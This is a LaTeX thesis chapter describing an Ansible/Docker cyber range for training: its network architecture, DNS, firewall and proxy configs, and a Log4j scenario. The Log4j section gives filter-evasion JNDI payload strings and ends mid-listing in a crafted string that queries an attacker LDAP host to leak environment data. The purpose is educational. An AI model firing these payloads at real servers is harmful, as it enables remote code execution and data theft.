\chapter{Validation}\label{chap:validation}

\minitoc

\section{Methodology} \label{sec:validation_methodology}

As a way to validate the stated hypothesis (\textit{cf.} Section \ref{sec:research_problem}), we have acted upon a thorough process that consists of the following phases:

\begin{enumerate}
    \item \textbf{IaC Tools in Cyber Range Construction}: The role of IaC tools in the context of cyber range construction. % Use Cases | Ansible | Docker 
    \item \textbf{Architecture}: Where details on how the scenario construction process was taken into account, as well as insights on the logic followed.% Ansible
    \item \textbf{Custom Scenarios}: From Linux to Windows-based scenarios, details on how they were developed will be presented and how they can be attacked.
    \item \textbf{Imported Scenarios}: The process of importing scenarios from previous CTF competitions and how they managed to fit in the previously developed scenario construction.
    \item \textbf{Scenario Extensibility}: Details on how new scenarios could be developed and the necessary changes to do so.
    \item \textbf{Cloud Deployment}: Insights on how the cloud deployment was taken into account using Microsoft Azure as the cloud provider.
    \item \textbf{User Interface Panel}: Presentation of the UI responsible for managing scenarios' in a sort of a CTF-level style.
\end{enumerate}


\section{IaC Tools in Cyber Range Construction} \label{sec:validation_iac_tools_in_cr_construction}

According to Masek \textit{et al.} \cite{unleashing_full_potential_of_ansible_ref} ``\textit{the goal of the IaC is to provide system administrators with the ability to manage knowledge and experiences of plenty of subsystems from one place instead of the traditional approach where each subsystem has its dedicated administrator}''. As in the case of this article, Ansible was the selected tool to simplify the orchestration and configuration management tasks related to our subject, as it gives the ability to create a set of YAML playbook files containing procedural instructions on how a target machine should be configured. Its flexibility in working both in Linux and Windows machines and how easy it was to deploy configurations were critical aspects for choosing this tool. 

Across the entire development, Docker was the selected tool responsible for provisioning Docker containers. As Ansible works on a client-only topology, the Ansible application does not need to be installed in the containers. Therefore, Ansible is responsible for both the creation and the issuing of commands to these containers, and as a result, we build an enterprise-level network entirely made of Docker containers by simply issuing a command. The entire process is relatively trivial as long as the necessary configuration files are created, as discussed later. The role of IaC here is phenomenal, as the deployment of our network consists of snippets of code used for declaring how our infrastructure should be configured, which is different from the traditional programming concepts we are currently used to.

Lastly, in particular, situations, as we will later see, Vagrant, was used in order to create Windows-based scenarios. Essentially the setup we built was a Windows Vagrant box running within the Linux Docker container, letting Windows-based types of attacks be successfully explored by the trainee. One question may arise: \textit{Why not use a Windows VM instead of a Vagrant box inside a Docker container?} The issue with this approach is that more storage will be needed if we intend to run several instances of the Windows VM. Instead, the Docker read-only image will stay the same if we use the first-mentioned approach.
Only the container that derives from that same image will change, adding its read-write layer that interacts with the Docker read-only image. As a result, the system uses way less storage. Concerning Windows-based VMs, a similar approach can be taken into account. In scenarios with more than one Windows VM, an optimal solution to reduce resource consumption would be to use a container with a hypervisor installed responsible for monitoring all the present Windows VMs, instead of having one hypervisor per Windows VM. This can be achieved using linked clones in Vagrant in which new VMs only differing in disk images are created using the parent disk image belonging to a master VM. Another key aspect of choosing this setup was consistency. We wanted to create scenarios based on containers and not use a hybrid approach that used containers and VMs separately. With this, we are ready to move into the architectural details of the project.

The engineering process, along with these tools, allowed us to obtain a set of cybersecurity training scenarios that can be run locally without needing an enormously complex infrastructure. More specifically, the lightweight containerization approach followed during the development allowed us to run complex scenarios with a distance of a command or click. In Chapter \textbf{CLOUD DEPLOYMENT}, we also discuss how we could export our set of cyber ranges into a remote machine again, with the help of Ansible, to perform every needed remote configuration.

\section{Architecture} \label{sec:validation_architecture}

The scenario construction process using Docker containers targeted enterprise-level networks. As such, corporate environments normally subdivide networks into three different main sections:

\begin{itemize}
    \item \textbf{External Network} refers to the public internet where machines are not controlled by the organization. As such, risk modeling activities should be taken into account in order to evaluate the risk and the probability specific threats and attack scenarios pose to the internals of the organization. With this, according to the organization's budget, decisions on which security measures to place in the company's network are considered and may include systems like Intrusion Detection Systems (IDS), Intrusion Prevention Systems (IPS), Firewalls, Antivirus, among others.
    \item \textbf{Internal Network} which contains the protected machines of an organization, such as internal databases and services only available to the company's employees and not to the general public.
    \item \textbf{Demilitarized Zone (DMZ)}, which is a network that protects the company's internal network and is targeted with untrustworthy traffic. It includes services available to the public and sits between the \textit{External Network} and the \textit{Internal Network}. It generally includes web servers, Domain Name System (DNS) servers, among others.
\end{itemize}

Our project focuses on these three distinct types of networks and considers several network services that we would typically see on enterprise networks, as depicted in Fig. \ref{fig:template_net}

The network architecture presented in Fig. \ref{fig:template_net} shows the services available on every Linux scenario, except for Windows-based scenarios, which slightly differ from this schema. As shown, Ansible appears as the tool responsible for configuring and provisioning the entire network.

\begin{figure}[H]
    \includegraphics[width=12cm]{figures/example.pdf}
    \caption{Template Network Architecture.}
    \label{fig:template_net}
\end{figure}

\subsection{Ansible Architecture} \label{sec:ansible_structure}

Three different playbooks include all the developed scenarios. The first is explicitly used in Linux-based scenarios, representing most designed challenges. The second is used for the Windows Ransomware scenario, and the last for the Windows Active Directory (AD) scenario. On each one of these playbooks, the first step is always to delete stale Docker containers from previous running scenario executions, as shown in Listing \ref{lst:ansible_removal_of_stale_containers}.

\begin{lstlisting}[language=yaml,caption=Removal of Stale Containers.,numbers=none,label={lst:ansible_removal_of_stale_containers}]
- hosts: localhost
  pre_tasks:
    - name: Remove Stale Containers
      ansible.builtin.include_tasks: teardown.yml
      loop: "{{ machines + vulnerables.machines }}"
      loop_control:
        loop_var: pc_info
\end{lstlisting}

Essentially, for every machine object passed, the contents of the \textit{teardown.yml} file are run. This uses the \textit{community.docker.docker\_container} module that is builtin in Ansible and removes the container under a given name.

\begin{lstlisting}[language=yaml,caption=File \textit{teardown.yml}.,numbers=none,label={lst:ansible_teardown}]
- name: Remove Stale Containers (name="{{ pc_info.name }}")
  community.docker.docker_container:
    name: "{{ pc_info.name }}"
    state: absent
\end{lstlisting}

\subsection{Ansible Groups and Inventory} \label{sec:ansible_groups_inventory}

% Inventory & Groups

Every machine belongs to a group, by default in Ansible, the \textit{all} group. Nonetheless, other groups and respective members were defined in the so-called Ansible Inventory, as presented in Listing \ref{lst:ansible_inventory}.

\begin{lstlisting}[caption=High-level view of Ansible Inventory.,numbers=none,label={lst:ansible_inventory},literate={=}{$\rightarrow{}$}{1}]
[routers]
[firewalls]
[external]
[internal]
    = [pcs]
    = [dhcp_servers]
[dmz]
    = [dns_servers]
    = [custom_machines] # Scenario's vulnerable machines.
    = [reverse_proxies]
\end{lstlisting}

As depicted in Listing \ref{lst:ansible_inventory}, each word represents a group of one or more machines. Each group may have several child groups defined by their name, as it happens above, or by machines, represented by their FQDN or IP address. We found groups themselves very useful when restricting certain tasks per group. Then, some groups contain child groups, as happens with the \textit{internal} and \textit{dmz} groups. In the case of Windows-based scenarios, another group called \textit{machine} is used and refers to the Docker container containing the Windows Vagrant box. Listing \ref{lst:ansible_inventory} was a very high-level view of how groups are organized within the project. A custom python inventory script was created to allow the specification of variables across each group.

\subsection{Generic Scenario Variables} \label{sec:generic_scenario_variables}

For each playbook, a set of variables are always defined corresponding to the generic structure of the network, as presented in Fig. \ref{fig:template_net}. We start with the Docker images used across the workflow, their path, and the default image name in case none is specified.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Docker Images.,numbers=none,label={lst:ansible_vars_1}]
general:
  images:
    - name: kali_test_img
      path: ./attacker
    - name: base_image
      path: .
  default_container_image_name: base_image
\end{lstlisting}

As shown in Listing \ref{lst:ansible_vars_1}, we use two Docker images: \textit{base\_image} and \textit{kali\_test\_img}. The former is an image derived from \textit{node:lts-alpine} with some extra packages installed. The Alpine distribution was chosen due to its smaller size compared to other images. As a result, the \textit{base\_image} size is around 230MB. The \textit{kali\_test\_img} is an image derived from the official \textit{kalilinux/kali-rolling} Docker image. This image was extended to include the Xfce\footnote{\url{https://www.xfce.org/}} desktop environment, characterized by its low resource consumption and user-friendliness, as well as \textit{Virtual Network Computing} (VNC) package, which allows screen sharing and remote control from another device, meaning the computer screen, keyboard, and mouse are mapped from an external device to the device installed with VNC. Accessing port 6080 on the target machine makes it possible to obtain remote control over it, which will be later used in the scenarios. This Kali Linux image is especially suited for offensive tasks, and here the only concern was providing the trainee with a broad range of tools he could use in a scenario. Therefore, the image's size is much larger (around 11GB) compared to the \textit{base\_image} used for common network services.

The second category of Ansible variables for machines belonging to the \textit{all} group can be seen in Listing \ref{lst:ansible_vars_2}.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Docker Networks.,numbers=none,label={lst:ansible_vars_2}]
networks:
  internal_net:
    network_addr: 172.{{ random_byte }}.0.0/24
    gateway_addr: 172.{{ random_byte }}.0.254
    random_byte: "{{ random_byte }}"

  dmz_net:
    network_addr: 172.{{ random_byte | int - 5 }}.0.0/24
    gateway_addr: 172.{{ random_byte | int - 5 }}.0.254
    random_byte: "{{ random_byte | int - 5 }}"

  external_net:
    network_addr: 172.{{ random_byte | int - 10 }}.0.0/24
    gateway_addr: 172.{{ random_byte | int - 10 }}.0.254
    random_byte: "{{ random_byte | int - 10 }}"
\end{lstlisting}

This section concerns Docker networks, according to the structure mentioned in Section \ref{sec:validation_architecture}. The range of each network is defined, as well as the gateway address which points to the host machine. This is mandatory by Docker, as the host machine should always take part in each created virtual Docker network so it can forward packets from and to it later. At last, the \textit{random\_byte} points to a random byte that changes across each scenario execution and confers some degree of randomization as for each new scenario execution, the network IP addresses will change. 

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Machines.,numbers=none,label={lst:ansible_vars_3}]
machines:
  - name: attackermachine
    image: kali_test_img
    volumes:
      - "/dev/net/tun:/dev/net/tun"
    group:
      - external
      - mesh
    published_ports: # There is also the exposed_ports when no mapping to the host machine is needed 
      - 5900:5900
      - 6080:6080
    dns: 
      name: edge_router
      network: external_net
    networks:
      - name: external_net
        ipv4_address: 172.{{ networks.external_net.random_byte }}.0.2
\end{lstlisting}

Listing \ref{lst:ansible_vars_3} presents a typical example of the attacker machine used for offensive tasks. Several attributes are specified according to the logic of a Docker container. We start by its name, the Docker image it uses, possible volumes (anonymous, named, or bind mounts), the groups the container belongs to, and published ports, meaning ports mapped between the Docker container and the host machine. Then, we specify the networks the container belongs to, which can be several, for instance, routers, and lastly, we specify where to find the DNS server. In this case, as the attacker machine is located in the external network, we redirect DNS queries to the edge router's network interface sitting in the external network so that these queries are later forwarded to the DNS server in the DMZ. This is achieved using \texttt{iptables} rules. For machines located inside the corporate network, DNS queries are sent directly to the DNS server sitting in the DMZ network without the need for any type of forwarding by the edge router. It is also important to mention other attributes that are also possible to be specified, namely the \textit{devices} and \textit{privilege} attributes. Although Listing \ref{lst:ansible_vars_3} provided only an example of the attacker machine, other network services follow a similar logic.

\subsection{Custom Scenario Variables} \label{sec:custom_scenario_variables}

After presenting how the standard setup for each scenario is organized, Listing \ref{lst:ansible_vars_4} shows how customized variables for each scenario are structured, starting with an example of a DNS configuration.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - DNS.,numbers=none,label={lst:ansible_vars_4}]
dns:
  - domain: example-domain.ui.com
    internal:
      machine: vuln_service
      network: dmz_net
    external:
      machine: edge_router
      network: external_net
\end{lstlisting}

Here, a domain named \textit{example-domain.ui.com} is presented along with \textit{internal} and \textit{external} specifications of it. This, as will later be explained, is related to two distinct DNS views that are defined. By ``internal view'' we refer to devices in the internal or DMZ networks; otherwise, they belong to the ``external view''. So, in the listing mentioned above, the \textit{example-domain.ui.com} domain points to the \textit{vuln\_service} container located in the DMZ whenever devices in the ``internal view'' look for this domain. Devices in the ``external view'' point to the external network interface of the edge router. This means resolved DNS requests made by external machines will go through the edge router and be forwarded to the respective machine. 

After talking about DNS, we will go over another set of variables, namely the set of custom machines.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Custom Images.,numbers=none,label={lst:ansible_vars_5}]
vulnerables:
  images:
    - name: unifi_log4j
      path: scenarios/log4j
      dockerfile: Dockerfile.alpine.mongo
      args:
        VERSION: "6.4.54"
\end{lstlisting}

Listing \ref{lst:ansible_vars_5}, similarly to \ref{lst:ansible_vars_1}, presents the set of Docker images from the collection of custom machines. Still, this representation is a bit more flexible, allowing the specification of the name of the``Dockerfile''' and arguments to be read in the Docker image creation process.

Then, in the vulnerable machines section, the situation is quite the same as in Listing \ref{lst:ansible_vars_3}. The only exception is the variables attribute specific to each machine.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Custom Machines.,numbers=none,label={lst:ansible_vars_6}]
vulnerables:
  machines:
    - name: reverse_proxy1
      image: reverse_proxy
      # ... #
      vars:
        - domain: adminbot.mc.ax
          targets: 
            - name: admin_bot_frontend
              network: dmz_net
              port: 3000
        - domain: adminbotapi.mc.ax
          targets: 
            - name: admin_bot_api
              network: dmz_net
              port: 8000
\end{lstlisting}

For instance, Listing \ref{lst:ansible_vars_6} refers to an NGINX reverse proxy that redirects requests according to a specified domain. The \textit{vars} attribute specifies which machine and port should be the network packets' target when communicating with a particular domain.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Port Forwarding.,numbers=none,label={lst:ansible_vars_7}]
port_forwarding:
  - destination_port: 443
    to_machine: reverse_proxy1
    to_network: dmz_net
    to_port: 443
\end{lstlisting}

Then, Listing \ref{lst:ansible_vars_7} references the port forwarding section especially relevant for external machines and how they can communicate with DMZ machines. 

\begin{itemize}
    \item \textit{destination\_port}: the incoming port on the edge router where packets will be redirected.
    \item \textit{to\_machine}: the target machine to which packet reaching the \textit{destination\_port} will be forward to.
    \item \textit{to\_network}: the network where the target machine is placed.
    \item \textit{to\_port}: the destination port in the target machine to where the edge router will redirect packets to.
\end{itemize}

Some names, such as \textit{destination\_port} and \textit{to\_port}, may be misleading. Still, they obey the convention used by \texttt{iptables}.

\begin{lstlisting}[language=yaml,caption=Ansible Variables - Setup Section.,numbers=none,label={lst:ansible_vars_8}]
setup:
    machines:
    -   name: localhost
        setup: "{{ playbook_dir }}/scenarios/chessrs/setup/"
    -   name: attackermachine
        setup: "{{ playbook_dir }}/scenarios/chessrs/attacker_machine_setup/*.j2"
\end{lstlisting}

Lastly, we have Listing \ref{lst:ansible_vars_8}, which provides information on where to find the setup instructions for the \textit{localhost} and attacker machines.

\subsection{Ansible Roles \& Network Services} \label{sec:ansible_roles}

The structure followed by Ansible used a feature called ``roles''. We used a different role for every milestone in the network configuration. Ansible allows defining specific variables and tasks for each role, making grouping an entire workflow into separate roles straightforward to reuse in the development cycle. The used folder structure can be viewed in Listing \ref{lst:ansible_roles}.

\begin{lstlisting}[caption=Ansible Roles' Folder Structure.,numbers=none,label={lst:ansible_roles}]
roles/
    base/             
    custom_machines/
    dhcp/
    dmz/
    dns/
    entrypoint/
    firewall/
    internal/
    internal_pcs/
    mesh/
    reverse_proxies/
    routers/
\end{lstlisting}

Each directory inside \textit{roles} represents a different role. Inside it, specific tasks are defined. The following sections detail the tasks present for each role. 

\subsubsection{Base Role} \label{sec:ansible_base_role}

The \textit{base} role is responsible for the scenario's initial tasks:

\begin{itemize}
    \item Start the Docker service.
    \item Building the scenario's Docker images, as presented in Listings \ref{lst:ansible_vars_1} and \ref{lst:ansible_vars_5}.
    \item Create the Docker networks, as presented in Listing \ref{lst:ansible_vars_2}.
    \item Create generic scenario's Docker containers, as presented in Listing \ref{lst:ansible_vars_3}.
    \item Assign each created container to one or more Ansible groups.
\end{itemize}

\subsubsection{DHCP Role} \label{sec:ansible_dhcp_role}

The \textit{DHCP} role is responsible for configuring the DHCP servers. At first, the \texttt{dhcp} package is installed. Then a template configuration file, as shown in Listing \ref{lst:dhcp_configuration_role}, is created. At last, the \texttt{dhcp} service daemon is started.

\begin{lstlisting}[caption=DHCP Server Template Configuration.,numbers=none,label={lst:dhcp_configuration_role}]
default-lease-time 600;
max-lease-time 7200;
authoritative;
option rfc3442-classless-static-routes code 121 = array of integer 8;

subnet 172.{{ networks.internal_net.random_byte }}.0.0 netmask 255.255.255.0 {
  range 172.{{ networks.internal_net.random_byte }}.0.64 172.{{ networks.internal_net.random_byte }}.0.127;
  option routers {{ ((machines | selectattr('name', '==', 'internal_router'))[0]['networks'] | selectattr('name', '==', 'internal_net') | map(attribute='ipv4_address')) | first }};
  option domain-name-servers {{ ((machines | selectattr('name', '==', 'dns_server'))[0]['networks'] | selectattr('name', '==', 'dmz_net') | map(attribute='ipv4_address')) | first }};
}
\end{lstlisting}

Essentially, the DHCP lease is responsible for assigning an internal IP address with the last byte ranging from 64 to 127, pinpointing the router of the internal network as the gateway router, and updating the DNS server with the one placed in the DMZ network.

\subsubsection{Internal PCs Role} \label{sec:ansible_internal_pcs_role}

The \textit{internal PCs} role handles the behavior of machines inside the internal network. As such, it runs the following tasks:

\begin{itemize}
    \item Install the DHCP client package.
    \item Ask for a DHCP lease to the DHCP server.
    \item Removes the automatically assigned IP address by Docker so that its only IP address is the one stated by the DHCP server.
\end{itemize}

\subsubsection{Internal Role} \label{sec:ansible_internal_role}

The \textit{internal} role is destined for the internal machines and DHCP server. It simply configures each device's default route as the internal router's interface located in the internal network. Every time a default gateway or static route is configured across the Ansible setup, the \textit{iproute2} package, installed on each Docker image by default, is used, which allows controlling and monitoring various aspects of networking in the Linux kernel, namely routing, tunnels, network interfaces, traffic control, among others.

\subsubsection{DNS Role} \label{sec:ansible_dns_role}

The \textit{DNS} role is somewhat of a more complex role and is destined for DNS servers. It is responsible for running the following actions:

\begin{itemize}
    \item Install the \texttt{bind} DNS server package.
    \item It copies the necessary template DNS configuration files to the DNS server container.
    \item Starts the \texttt{named} DNS service.
\end{itemize}

Two Access Control Lists (ACLs) are created regarding the DNS configuration files. The \textit{internal} deals with which machines stand in the internal and DMZ networks, and the \textit{external} points to every other machine that is not part of the \textit{internal} ACL, meaning external machines only. Afterward, a distinction on the IP addresses retrieved by resolved domains for internal and external machines is made, according to what was presented in Listing \ref{lst:ansible_vars_4}. The actual configuration file is presented in Listing \ref{lst:dns_configuration_file}

\begin{lstlisting}[caption=DNS Server Template Configuration.,numbers=none,label={lst:dns_configuration_file}]
acl "exclude" {
    {{ (machines | selectattr('name', '==', 'edge_router'))[0]['networks'] | selectattr('name', '==', 'dmz_net') | map(attribute='ipv4_address') | first }};
};

acl internals {
    !exclude;
    172.{{ networks.internal_net.random_byte }}.0.0/24;
    172.{{ networks.dmz_net.random_byte }}.0.0/24;
};

view "internal" {
    match-clients { internals; };

    {% for info in dns -%}
    zone "{{ info.domain }}" {
        type master;
        file "/var/bind/db.internal.{{ info.domain }}";
    };
    {% endfor +%}
};

view "external" {
    match-clients { any; };

    {% for info in dns -%}
    zone "{{ info.domain }}" {
        type master;
        file "/var/bind/db.external.{{ info.domain }}";
    };
    {% endfor +%}

    # ... #
};}
\end{lstlisting}

Notice the use of Jinja2\footnote{\url{https://jinja.palletsprojects.com/en}} templating. Essentially, we create an ACL named ``exclude'' which refers to the IP address of the edge router that will perform NAT-specific packets coming from outside the organization's network. Then, we create the ``internal'' and ``external'' views, as mentioned above, which direct to different DNS zones according to the mapped domain. If the DNS query does not match an internal domain, the request will be forwarded to the \texttt{8.8.8.8} Google's public DNS server.

\subsubsection{Router Role} \label{sec:ansible_router_role}

The next role leads us to the router's configuration steps. Here we distinguish the configuration of the internal router and the one of the edge router. 

The internal router takes a single action to configure its default gateway with the edge router's DMZ network interface, as this is the gateway that provides internet access to the network.

The edge router's task is to provide NAT to packets whose source matches the internal or DMZ networks. This is accomplished using the \texttt{MASQUERADE jump} of \texttt{iptables}. Lastly, a static route by specifying that packets destined to the internal network should be directed to the DMZ interface of the internal router.

\subsubsection{Custom Machines Role} \label{sec:ansible_custom_machines_role}

The \textit{custom machines} role is quite similar to the \textit{base} role except that it performs Docker image and container creation on the set of specific machines required by a scenario instead of the generic ones. Although both roles slightly differ, using just one role with some small conditionals would be possible. Still, the adopted approach allows more accessible future updates.

\subsubsection{DMZ Role} \label{sec:ansible_dmz_role}

The \textit{DMZ} role is also quite simple. Its target is the DNS servers, the custom machines, and reverse proxies. Two tasks are associated with this role: the static configuration route to the internal network, which directs packets to the internal router's interface on the DMZ network, and the configuration of the default gateway to access the internet, which points to the edge router's DMZ network interface.

\subsubsection{Reverse Proxies Role} \label{sec:ansible_reverse_proxies_role}

The \textit{reverse proxies} role, as the name suggests, targets the reverse proxies present in the network. These services sit in front of the scenario's custom machines and forward client requests to those machines. Essentially, they allow establishing HTTPS connections with the client device, handling all the SSL certificate-related tasks, and talking with the destination machine sitting in the back of the reverse proxy using an HTTP connection. In simple words, it works as a middle agent.

As presented in Listing \ref{lst:ansible_vars_6}, the variables defined for the reverse proxy include a domain and information on the target machine. We provide a piece of the NGINX configuration file at Listing \ref{lst:reverse_proxy_configuration_file}. Again, it allows the configuration of several domains specified using Jinja2 templates. The reverse proxy continuously listens for connections at port 443, and according to the selected domain, it forwards the traffic to the appropriate target. If requests are made to port 80, they are redirected to port 443, meaning the HTTP connection gets upgraded to HTTPS.

\begin{lstlisting}[caption=Reverse Proxy Template Configuration.,numbers=none,label={lst:reverse_proxy_configuration_file}]
http {
    sendfile on;
    large_client_header_buffers 4 32k;

    {%+ for vars in machine_vars %}
    
    upstream service-{{ loop.index }} {
    {% for target in vars.targets %}
    server {{ ((selected_machines | selectattr('name', '==', target.name))[0]['networks'] | selectattr('name', '==', target.network) | map(attribute='ipv4_address')) | first }}:{{ target.port }};
    {% endfor -%}
    }

    server {
        listen 80;
        server_name {{ vars.domain }};

        location / {
            return 301 https://$host$request_uri;
        }
    }

    server {
        listen 443 ssl;
        server_name {{ vars.domain }};

        ssl_certificate /etc/ssl/certs/{{ vars.domain }}.crt;
        ssl_certificate_key /etc/ssl/private/{{ vars.domain }}.key;

        location / {
            proxy_pass         http://service-{{ loop.index }};
            proxy_redirect     off;
            proxy_http_version 1.1;
            # ... #
        }
    }
    {% endfor %}
}
\end{lstlisting}

After copying the above-listed template configuration file to the reverse proxy, we must deal with SSL certificates. For this, we first created a Certificate Authority (CA) by defining an \texttt{openssl.cnf} file and the necessary folder structure, as well as generating the public and private keys associated to the CA.

The \textit{reverse proxies} role generates a Certificate Signing Request (CSR), a specially formatted encrypted message sent from an SSL digital certificate applicant to a CA. The CA then takes the CSR and generates a public-key certificate signed by itself. At last, it removes the password from the private key of the newly issued private key and copies both this file and the public-key certificate to the reverse proxy container. At last, it starts the NGINX service with the loaded configuration. 

One crucial aspect of this configuration is the signing of public-key certificates by the CA. This entails that the created root CA has to be trusted by machines that will eventually access the domain linked to the digital certificate, in this case, the attacker machine. To achieve such setup, the CA public-key certificate is loaded as trusted in this machine both system-wide and in Fiferox, as it will be later explained.

\subsubsection{Firewalls Role} \label{sec:ansible_firewalls_role}

The \textit{firewall} role focuses on the two existing routers which incorporate a firewall. During this explanation, we will refer to the internal router's firewall as the internal firewall, and to the edge router's firewall, we will refer to it as the external firewall. 

Starting with the internal firewall, the role performs the following \texttt{iptables} actions:

\begin{itemize}
    \item Set the forward chain's default policy to drop, meaning the internal router does not forward any traffic by default.
    \item Already established connections or connections previously associated with existing ones to the internal network are accepted.
    \item New, previously established, or related connections from the internal network are also accepted.
\end{itemize}

Concerning the external firewall, this role performs the following \texttt{iptables} actions:

\begin{itemize}
    \item \textbf{Generic Rules:}
        \begin{itemize}
            \item Set the forward chain's default policy to drop, meaning the internal router does not forward any traffic by default.
            \item Already established connections or connections previously associated with existing ones to the internal or DMZ networks are accepted.
            \item Packets from the internal or DMZ networks are also accepted in the forward chain.
        \end{itemize}
    \item \textbf{DNS Rules:}
        \begin{itemize}
            \item Set a ``prerouting'' chain rule in which TCP and UDP traffic reaching the edge router's port 53 will have its destination changed (DNAT) to the real DNS server sitting in the DMZ network and destination port 53.
            \item Forwarding traffic to the DNS server is accepted.
            \item A ``postrouting'' NAT rule is added to traffic whose destination is the DNS server.
        \end{itemize}
    \item \textbf{Port Forwarding Rules:}
        \begin{itemize}
            \item Allow TCP and UDP forwarding according to the information provided in the example of Listing \ref{lst:ansible_vars_7}. We consider the target machine and the target port number in this regard.
            \item Accept TCP and UDP traffic in the ``prerouting'' chain according to the information provided in the example of Listing \ref{lst:ansible_vars_7}. We consider the target machine and the destination port number in this regard.
            \item A ``postrouting'' NAT rule for the target machines as in the example of Listing \ref{lst:ansible_vars_7}.
        \end{itemize}
\end{itemize}

With both the internal and external firewalls, we intend to restrict the allowed traffic from the devices externally placed with respect to the organization's network. Only certain services in the DMZ should be allowed external access, never devices from the internal network. On the other hand, connections from inside the corporate network are allowed. This configuration uses \textit{iptables}. Therefore the rules are not based on highly-complex logic like which domains an internal device tries to access and if they should be blocked, according to a blocklist of IP addresses and domains.

\subsubsection{Entry point Role} \label{sec:ansible_entrypoint_role}

The \textit{entry point} role performs the necessary tasks to configure a certain machine, as defined at Listing \ref{lst:ansible_vars_8}. It creates the environment needed to run the setup scripts, which may include copying template files to the Docker container and then executing the entry point script. This role distinguishes when being conducted by the \textit{localhost} machine or a different machine. For the \textit{localhost}, the entry point script is run without any previous configuration. In the case of the other machines, the Jinja2 template setup files are first copied to the target container, and then the entry point script is run.

\subsubsection{Mesh Role} \label{sec:ansible_mesh_role}

The \textit{mesh} role handles devices that need to join the Tailscale network, called \textit{tailnet}. As explained in Section \ref{sec:selected_tools_tailscale}, this network allows communication between each device that belongs to it. This is useful when focusing on cloud deployments if we, for instance, want to connect to port 6080 on our attacker machine to be able to control it remotely and, as we will see, in the Windows-based scenarios to access the Windows Vagrant box using \textit{remote desktop}. 

This role's actions start by installing Tailscale and starting the \textit{tailscaled} service. After this, the container is instructed to join a specific Tailscale network using an authentication key and by specifying a hostname for the machine. An authentication key allows the addition of new nodes to the Tailscale network without needing to sign in to the network. As such, a reusable authentication key was created to connect multiple nodes to the network. Each time a new node joins the Tailscale network using this authentication key, it enters the group of Tailscale ephemeral nodes, which essentially refer to short-lived devices that are automatically removed from the network after a short period of inactivity and are immediately removed from the network in case they are instructed to do so. Also, the usage of the same hostname for a particular machine allows accessing it using a Tailscale feature called ``MagicDNS'' which essentially registers all the DNS names for the network's devices using the following logic: \texttt{[Device Hostname].[Network DNS Name]}
The device's hostname was already mentioned above. By default, the network's DNS name is chosen by Tailscale upon the first usage. The ``MagicDNS'' configuration provides easy access to machines when they are not under our control. This will be very useful in the chapter of \textbf{CLOUD DEPLOYMENT}.

\section{Custom Scenarios} \label{sec:validation_custom_scenarios}

The set of custom scenarios involve three distinct cyber ranges:

\begin{itemize}
    \item A Linux scenario that explores the Apache Log4j vulnerability (CVE-2021-44228).
    \item A Windows-based scenario that explores a Ransomware malware executable that encrypts a set of files.
    \item A Windows-based scenario that exposes a vulnerable Active Directory Domain Controller that provides a wide attack surface where the trainee can experiment several attacks. 
\end{itemize}

For each challenge, details on how to solve them will be revealed. We will present some of the intended solutions to get the secret flag and, when available, unintended solutions.

\subsection{Log4j Scenario} \label{sec:validation_log4j_scenario}

The Apache Log4j vulnerability started haunting the world during the last month of the year of 2021. It was based on the Java-based logging package Apache Log4j and essentially allowed an attacker to execute code on a remote server, the so-called Remote Code Execution (RCE). The scope of machines this vulnerability targeted was huge and some put it in the same level of the most serious vulnerability along with \textit{Heartbleed} and \textit{Shellshock}. CVE-2021-4428\footnote{\url{https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228}} details which Log4j versions were affected and gives a brief insight of what is the vulnerability about. In simple words, an attacker that can control log messages may run arbitrary code by means of a process called message lookup substitution.

Back in 2013, there was an upgrade in the Log4j package: the ``JNDILookup plugin''. JNDI means Java Naming and Directory Interface, and is a directory service that allows finding data in the form of a Java object through a directory. A directory service is essentially a database for storing information on users and resources. It is often used to manage access privileges, monitor, and control access to applications and infrastructure resources. JNDI supports a wide variety of directory services, being the most famous the Lightweight Directory Access Protocol (LDAP). This was the most targeted directory service in Log4j exploits. Java programs may use JNDI and LDAP together to find a Java object containing specific data. For instance, an URL such as \texttt{ldap://localhost:389/o=FEUPThesis} retrieves information on the \textit{FEUPThesis} object from the LDAP server running in port 389 of the same machine. In this example we used the combination \textit{localhost:389}, but the LDAP server could be potentially located anywhere on the internet. If an attacker controls the above-mentioned LDAP URL then this means they can potentially cause a program to load a malicious object from a server under their control and get remote execution control over a machine.

Apache Log4j's syntax\footnote{\url{https://logging.apache.org/log4j/2.x/manual/configuration.html}} follows the pattern \texttt{\$\{prefix:name\}} where \texttt{prefix} is a lookup in the list of available lookups\footnote{\url{https://logging.apache.org/log4j/2.x/manual/lookups.html}}. Other examples, such as \texttt{\$\{java:version\}} would also be accepted and, in this case, would retrieve the current version of Java. Lookup messages were allowed to be used both in the Log4j configuration an in logged messages. The latter was what caused the vulnerability.

All the attacker has to do is find an input that gets logged and add a malicious JNDI query that includes a malicious LDAP server controlled by the attacker. On web servers logged information typically includes the \textit{User-Agent} HTTP header or the inputted \textit{username}, for instance.

There are techniques that can be used to evade simplistic blocking of strings like \texttt{\$\{jndi:ldap} by using some features of Log4j. For instance, we can use the \texttt{\$\{lower\}} feature which lowercases characters: \texttt{\$\{jndi:\$\{lower:l\}\$\{lower:d\}a\$\{lower:p\}://example.com/x\}}. The usage of the \texttt{:-} syntax which enables the attacker to set a default value for a lookup and if the value looked up does not exist, then the predefined default value is considered:

\texttt{\$\{jndi:\$\{env:NOTEXIST:-l\}d\$\{env:NOTEXIST:-a\}\$\{env:NOTEXIST:-p\}}


Similar techniques use strings like \texttt{\$\{\$\{::-j\}\$\{::-n\}\$\{::-d\}\$\{::-i\}}. Other techniques include encoding \textit{\$\{} as \textit{\%24\%7B} or \textit{\textbackslash u0024\textbackslash u007b}.

During this period of cyber war if we can call it that way, there were attempts to gather information on the target machine using crafted strings. Several attempts were made to gather the machine users, Docker image names, home directory paths, details on Kubernetes and Spring, users and passwords from databases, hostnames, among others, as shown in Listing \ref{lst:log4j_crafted_string}.

\clearpage

\begin{lstlisting}[caption=Log4j Crafted String.,numbers=none,label={lst:log4j_crafted_string}]
${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:
